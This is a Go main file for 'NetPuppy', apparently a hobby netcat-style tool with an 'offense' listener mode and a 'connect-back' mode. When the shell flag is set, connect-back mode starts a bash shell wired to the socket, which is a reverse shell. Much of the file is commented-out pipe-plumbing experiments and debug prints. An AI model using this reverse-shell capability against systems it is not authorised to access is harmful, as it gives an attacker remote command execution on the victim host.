package main

import (
	"bufio"
	"bytes"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"time"

	// NetPuppy modules:
	"netpuppy/utils"
)

func runApp(c utils.ConnectionGetter) {
	// Parse flags from user, attach to struct:
	flagStruct := utils.GetFlags()

	// Print banner:
	fmt.Printf("%s", utils.Banner())

	// Create peer instance based on user input:
	var thisPeer *utils.Peer = utils.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)
	fmt.Printf("Address of peer in main.go = %p\n", thisPeer)

	// Update user:
	var updateUserBanner string = utils.UserSelectionBanner(thisPeer.ConnectionType, thisPeer.Address, thisPeer.RPort, thisPeer.LPort)
	fmt.Println(updateUserBanner)

	// Make connection:
	var socket utils.Socket
	if thisPeer.ConnectionType == "offense" {
		socket = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
		//fmt.Printf("Socket address in main.go = %p\n", socket)
	} else {
		socket = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address)
	}

	// Set read deadline on socket (timeout after x time while trying to read socket):
	// deadlineErr := socket.SetSocketReadDeadline(300)
	// if deadlineErr != nil {
	// 	log.Fatalf("Error setting socket deadline: %v\n", deadlineErr)
	// }

	fmt.Printf("Address of socket in main.go: %p\n", socket)

	// Connect socket connection to peer
	thisPeer.Connection = socket
	fmt.Printf("Address of socket on peer struct = %p\n", thisPeer.Connection)

	// If shell flag is true, start shell:
	var shell utils.BashShell
	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
		var realShellGetter utils.RealShellGetter

		shell = realShellGetter.GetConnectBackInitiatedShell()
		fmt.Printf("Address of shell in main.go: %p\n", shell)

		// Connect shell to peer:
		// Get pointer to shell underlying interface:
		thisPeer.ShellProcess = shell
		fmt.Printf("address of shell on peer struct (main.go) = %p\n", thisPeer.ShellProcess)
	}

	// Update banner w/ missing port:
	// var missingPortInBanner = utils.PrintMissingPortToBanner(thisPeer.ConnectionType, thisPeer.Connection)
	// fmt.Println(missingPortInBanner)

	// Start SIGINT go routine & start channel to listen for SIGINT:
	listenForSIGINT(thisPeer)

	// var stdin *io.WriteCloser
	// var stdout *io.ReadCloser
	// var stderr *io.ReadCloser

	if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
		// Hook up the pipes & return pointers to them:
		// stdout = thisPeer.ShellProcess.PipeStdout()
		// fmt.Printf("Stdout address (main.go) = %p\n", stdout)
		// derefStdout := *stdout
		// defer derefStdout.Close()

		// stdin = thisPeer.ShellProcess.PipeStdin()
		// fmt.Printf("Stdin address (main.go) = %p\n", stdin)
		// var derefStdin io.WriteCloser = *stdin
		// defer derefStdin.Close()

		// stderr = thisPeer.ShellProcess.PipeStderr()
		// fmt.Printf("Stderr address (main.go) = %p\n", stderr)
		// derefStderr := *stderr
		// defer derefStderr.Close()

		// Point the shell file descriptors at the socket/conneciton:
		//thisPeer.ShellProcess.RrealShell.Stdin = thisPeer.Connection.RrealSocket
		// actualSocket := socket.(*utils.RealSocket)
		// actualRealSocket := *actualSocket
		// actualRealRealSocket := actualRealSocket.RrealSocket

		// fmt.Printf("actual real socket address: %p\n", &actualRealRealSocket)
		// derefStdin = actualSocket.RrealSocket
		// derefStderr = actualSocket.RrealSocket
		// derefStdin = actualSocket.RrealSocket
		// actualShell := thisPeer.ShellProcess.(*utils.RealShell)
		// actualActualSehll := *actualShell
		// actualActualRealShell := actualActualSehll.RrealShell
		// actualDereferencedRealShell := *actualActualRealShell
		// actualDereferencedRealShell.Stdin = actualRealSocket.RrealSocket
		// actualDereferencedRealShell.Stdout = actualRealSocket.RrealSocket
		// actualDereferencedRealShell.Stderr = actualRealSocket.RrealSocket

		// actualDereferencedRealShell.Start()
		// go func() {

		// 	actualDereferencedRealShell.Wait()
		// }()

		//		Start shell:
		socketT := socket.(*utils.RealSocket)
		//socketD := *socketT
		erR := thisPeer.ShellProcess.StartShell(socketT)
		if erR != nil {
			log.Fatalf("Error starting shell process: %v\n", erR)
		}

		/*
			start go routines to re-route
		*/

		// socketT := socket.(*utils.RealSocket)
		// socketDefec := *socketT
		// w := bufio.NewWriter(socketDefec.RrealSocket)
		// buffer := make([]byte, 1024)

		// tiddies, err := w.ReadFrom(os.Stdout)
		// if err != nil {
		// 	fmt.Printf("ERRPR: %v\n", err)
		// }

		// if tiddies > 0 {
		// 	fmt.Printf("Tiddies: %s\n", string(buffer[:tiddies]))
		// }

		// fmt.Printf("Address of shell process after start (main.go) = %p\n", thisPeer.ShellProcess)
		/*
			// Go routines for reading:
			readStdout := func(stdout *io.ReadCloser, c chan<- []byte) {
				// Dereference stdout and get the reader from the interface using type assertion:
				//deref := *stdout
				stdot := os.Stdout

				// Define some vars:
				var fullData []byte

				for {
					buffer := make([]byte, 1024)

					//bytesRead, err := io.ReadFull(deref, buffer)
					bytesRead, err := io.ReadFull(stdot, buffer)
					if err == nil {
						chunk := buffer[:bytesRead]
						fullData = append(fullData, chunk...)

						continue
					} else {
						// Check for EOF & ErrUnexpectedEOF from io package (want to continue)
						if errors.Is(err, io.EOF) {
							if len(fullData) > 0 {
								fmt.Printf("Sending into pipe from stdout: %s\n", string(fullData))
								c <- fullData

								// Reset:
								fullData = []byte{}
							}
						} else if errors.Is(err, io.ErrUnexpectedEOF) {
							// There is partial data in the buffer, add to fullData:
							chunk := buffer[:bytesRead]
							fullData = append(fullData, chunk...)

							if len(fullData) > 0 {
								c <- fullData

								// Reset:
								fullData = []byte{}
							}

							fmt.Println("Error is unexpected EOF (stdout)")
						} else {
							log.Fatalf("Error reading from Stdout: %v\n", err)
						}
						continue
					}
				}
			}

			readStderr := func(stderr *io.ReadCloser, c chan<- []byte) {
				// Dereference stderr and get the reader from the interface using type assertion:
				//deref := *stderr
				stder := os.Stderr

				// Define some vars:
				var fullData []byte

				for {
					buffer := make([]byte, 1024)

					//bytesRead, err := io.ReadFull(deref, buffer)
					bytesRead, err := io.ReadFull(stder, buffer)
					if err == nil {
						chunk := buffer[:bytesRead]
						fullData = append(fullData, chunk...)

						continue
					} else {
						// Check for EOF & ErrUnexpectedEOF from io package (want to continue)
						if errors.Is(err, io.EOF) {
							if len(fullData) > 0 {
								fmt.Printf("Sending into pipe from stderr: %s\n", string(fullData))
								c <- fullData

								// Reset:
								fullData = []byte{}
							}
						} else if errors.Is(err, io.ErrUnexpectedEOF) {
							// There is partial data in the buffer, add to fullData:
							chunk := buffer[:bytesRead]
							fullData = append(fullData, chunk...)

							if len(fullData) > 0 {
								c <- fullData

								// Reset:
								fullData = []byte{}
							}

							fmt.Println("Error is unexpected EOF (stderr)")
						} else {
							log.Fatalf("Error reading from Stderr: %v\n", err)
						}
					}
				}
			}

			readSocket := func(socket utils.Socket, c chan<- []byte) {
				// Read data in socket:
				for {
					dataReadFromSocket, err := socket.Read()
					if len(dataReadFromSocket) > 0 {
						fmt.Printf("data from socket is lenght: %v\n", len(dataReadFromSocket))
						// Trim white space:
						trimmed := bytes.TrimSpace(dataReadFromSocket)

						fmt.Printf("trimmed: %s\n", string(trimmed))
						c <- dataReadFromSocket
					}
					if err != nil {
						//Check for timeout error using net pkg:
						//....... (type assertion checks if 'err' uses net.Error interface)
						//....... (( isANetError will be true if it is using the net.Error interface))
						netErr, isANetError := err.(net.Error)
						if isANetError && netErr.Timeout() {
							// If the socket timed out, have to set read deadline again (or connection will close):
							socket.SetSocketReadDeadline(300)
							continue
						} else if errors.Is(err, io.EOF) {
							continue
						} else {
							log.Fatalf("Error reading data from socket: %v\n", err)
						}
					}
				}
			}

			// Go routines for writing:
			writeToStdin := func(data []byte, stdin *io.WriteCloser) {
				fmt.Printf("address of stdin is: %p\n", stdin)
				// Make sure the data actually has length:
				if len(data) > 0 {
					//deref := *stdin
					stdn := os.Stdin

					// Trim white space:
					trimmed := bytes.TrimSpace(data)

					fmt.Printf("lenght of data is %v\n", len(trimmed))
					//_, erR := io.WriteString(deref, string(trimmed))
					_, erR := io.WriteString(stdn, string(trimmed))
					if erR != nil {
						log.Fatalf("Error writing buffer to shell stdin: %v\n", erR)
					}
				}
				return
			}

			writeToSocket := func(dataToWrite []byte, socket utils.Socket) {
				// Check length so we can clear channel, but not send blank data:
				if len(dataToWrite) > 0 {
					fmt.Printf("data being written to tsocket: %s\n", string(dataToWrite))
					bytesWritten, erR := socket.Write(dataToWrite)
					if erR != nil {
						log.Fatalf("Error writing user input buffer to socket: %v\n", erR)
					}

					if bytesWritten <= 0 {
						fmt.Printf("No bytes written to socket?\n")
					}
				}
				return
			}

			// Make channels (checked in select for loop to see if we've read any data)
			readStdoutChan := make(chan []byte)
			readStderrChan := make(chan []byte)
			socketDataChan := make(chan []byte)
			defer func() {
				close(readStderrChan)
				close(readStdoutChan)
				close(socketDataChan)
			}()

			// Start go routines to read from shell and socket:
			go readStdout(stdout, readStdoutChan)
			go readStderr(stderr, readStderrChan)
			go readSocket(socket, socketDataChan)

			for {
				select {
				case dataFromStdout := <-readStdoutChan:
					fmt.Printf("Data from stdout: %s\n", string(dataFromStdout))
					go writeToSocket(dataFromStdout, socket)
				case dataFromStderr := <-readStderrChan:
					fmt.Printf("data from stderr: %s\n", string(dataFromStderr))
					go writeToSocket(dataFromStderr, socket)
				case dataFromSocket := <-socketDataChan:
					fmt.Printf("data from socket: %s\n", string(dataFromSocket))
					go writeToStdin(dataFromSocket, stdin)
				default:
					// Timeout
					time.Sleep(300 * time.Millisecond)
				}
			}
		*/
	} else {
		// Go routines to read incoming data:
		readUserInput := func(c chan<- string) {
			for {
				userReader := bufio.NewReader(os.Stdin)
				userInput, err := userReader.ReadString('\n')
				if err != nil {
					log.Fatalf("Error reading input from user: %v\n", err)
				}

				c <- userInput
			}
		}

		readSocket := func(socket utils.Socket, c chan<- []byte) {
			// Read data in socket:
			for {
				dataReadFromSocket, err := socket.Read()
				if len(dataReadFromSocket) > 0 {
					fmt.Printf("data from socket is lenght: %v\n", len(dataReadFromSocket))
					// Trim white space:
					trimmed := bytes.TrimSpace(dataReadFromSocket)

					fmt.Printf("trimmed: %s\n", string(trimmed))
					c <- dataReadFromSocket
				}
				if err != nil {
					//Check for timeout error using net pkg:
					//....... (type assertion checks if 'err' uses net.Error interface)
					//....... (( isANetError will be true if it is using the net.Error interface))
					netErr, isANetError := err.(net.Error)
					if isANetError && netErr.Timeout() {
						// If the socket timed out, have to set read deadline again (or connection will close):
						socket.SetSocketReadDeadline(300)
						continue
					} else if errors.Is(err, io.EOF) {
						continue
					} else {
						log.Fatalf("Error reading data from socket: %v\n", err)
					}
				}
			}
		}

		// Write go routines
		writeToSocket := func(dataToWrite string, socket utils.Socket) {
			// Check length so we can clear channel, but not send blank data:
			if len(dataToWrite) > 0 {
				fmt.Printf("writing to socket\n")
				bytesWritten, erR := socket.Write([]byte(dataToWrite))
				if erR != nil {
					log.Fatalf("Error writing user input buffer to socket: %v\n", erR)
				}

				if bytesWritten <= 0 {
					fmt.Printf("No bytes written to socket?\n")
				}
			}
			return
		}

		printToUser := func(data []byte) {
			// Check the length:
			if len(data) > 0 {
				_, err := os.Stdout.Write(data)
				if err != nil {
					log.Fatalf("Error printing data to user: %v\n", err)
				}
			}
			return
		}

		// Make channels:
		userInputChan := make(chan string)
		socketDataChan := make(chan []byte)
		defer func() {
			close(userInputChan)
			close(socketDataChan)
		}()

		// Start go routines to read from socket and user:
		go readSocket(socket, socketDataChan)
		go readUserInput(userInputChan)

		for {
			select {
			case dataFromUser := <-userInputChan:
				go writeToSocket(dataFromUser, socket)
			case dataFromSocket := <-socketDataChan:
				go printToUser(dataFromSocket)
			default:
				// Timeout:
				time.Sleep(3 * time.Millisecond)
			}
		}
	}
}

func listenForSIGINT(thisPeer *utils.Peer) { // POINTER: passing Peer by reference (we ACTUALLY want to close it)
	// If SIGINT: close connection, exit w/ code 2
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	go func() {
		for sig := range signalChan {
			if sig.String() == "interrupt" {
				fmt.Printf("signal: %v\n", sig)
				thisPeer.Connection.Close()
				os.Exit(2)
			}
		}
	}()
}

func main() {
	// In order to test the connection code w/o creating REAL sockets, runApp() handles most of the logic:
	var realConnection utils.RealConnectionGetter
	runApp(realConnection)
}

/*


golang process (os.stdin)
	- starts subprocess bash shell
	- -c



*/
